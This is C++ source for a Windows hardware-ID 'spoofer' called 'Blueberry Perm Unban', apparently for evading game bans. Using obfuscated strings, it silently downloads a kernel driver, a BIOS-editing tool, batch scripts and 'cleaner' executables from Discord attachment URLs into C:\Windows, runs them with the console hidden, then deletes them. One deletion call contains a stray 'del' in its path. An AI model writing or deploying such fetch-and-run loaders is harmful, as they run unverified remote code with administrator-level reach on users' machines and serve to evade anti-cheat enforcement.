
#include <iostream>
#include "xorstr.h"
#include <thread>
#include <Windows.h>
#include <string>

struct slowly_printing_stringg {
	std::string data;
	long int delay;
};

std::ostream& operator<<(std::ostream& out, const slowly_printing_stringg& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}

namespace Spoof {

	void Perm()
	{
		ShowWindow(GetConsoleWindow(), SW_MAXIMIZE);
		system(E("cls"));
		std::cout << slowly_printing_stringg{ "\n\n\n Please Wait While We Spoof Your PC We Will Also Open Up A Safe Cleaner. This Window Will Close For 5 Seconds",50 };
		Beep(500, 500);
		system(E("curl https://cdn.discordapp.com/attachments/1045069577035464704/1047255168028266566/amifldrv64.sys -o C:\\Windows\\amifldrv64.sys --silent"));
		system(E("curl https://cdn.discordapp.com/attachments/1045069577035464704/1047255167726260354/AMIDEWINx64.EXE -o C:\\Windows\\AMIDEWINx64.EXE --silent"));
		system(E("curl https://cdn.discordapp.com/attachments/1046198892397609041/1048714553329975366/spoof_1.bat -o C:\\Windows\\spoof.bat --silent"));
		system(E("curl https://cdn.discordapp.com/attachments/1044934520236941353/1047588683848634468/last.bat -o C:\\Windows\\end.bat --silent"));
		system(E("curl https://cdn.discordapp.com/attachments/1046784384314908763/1047265509978165309/AdvancedEventCleaner.exe -o C:\\Windows\\cleaner.exe --silent"));
		system(E("C:\\Windows\\cleaner.exe"));
		system(E("cls"));
		SetConsoleTitle(E(L"Blueberry Perm Unban       Leave A Vouch If This Worked"));
		std::cout << slowly_printing_stringg{ "\n\n\n Press Any Key To Perm Spoof",50 };
		system(E("pause >nul"));


		ShowWindow(GetConsoleWindow(), SW_HIDE);
		system(E("C:\\Windows\\spoof.bat"));
		system(E("cls"));
		ShowWindow(GetConsoleWindow(), SW_SHOW);
		system(E("C:\\Windows\\end.bat"));


		std::remove(E("C:\\Windows\\spoof.bat"));
		std::remove(E("C:\\Windows\\end.bat"));
		std::remove(E("C:\\Windows\\cleaner.exe"));
		std::remove(E("del C:\\Windows\\amifldrv64.sys"));
		std::remove(E("C:\\Windows\\AMIDEWINx64.EXE"));
		system(E("cls"));
	}

}

namespace Check {

	void checker()
	{
		Beep(500, 500);
		Sleep(200);
		system(E("cls"));
		system("color b");
		system(E("echo BaseBoard SN:"));
		Sleep(200);
		system(E("wmic baseboard get serialnumber"));
		Sleep(200);
		system(E("echo Bios SN:"));
		Sleep(200);
		system(E("wmic bios get serialnumber"));
		Sleep(200);
		system(E("echo Cpu SN:"));
		Sleep(200);
		system(E("wmic cpu get serialnumber"));
		Sleep(200);
		system(E("echo DiskDrive SN:"));
		Sleep(200);
		system(E("wmic diskdrive get serialnumber"));
		Sleep(200);
		std::cout << E("  ") << '\n';
		Sleep(200);
		system(E("echo -----------------------------------------------"));
		Sleep(200);
		system(E("echo Going back to Dashboard in 7 Seconds..."));
		Sleep(200);
		system(E("echo -----------------------------------------------"));
		Sleep(7000);
	}
}

namespace Cleaner {
	
	void cleaner()
	{
		std::cout << slowly_printing_stringg{ "\n\n\n Cleaning You PC Please Wait...",50 };
		system(E("curl https://cdn.discordapp.com/attachments/1047306944026787960/1047317556521865318/deepp_cleaner.exe -o C:\\Windows\\cleaner1.exe --silent"));
		system(E("C:\\Windows\\cleaner1.exe"));
		std::remove(E("C:\\Windows\\cleaner1.exe"));
	}
}
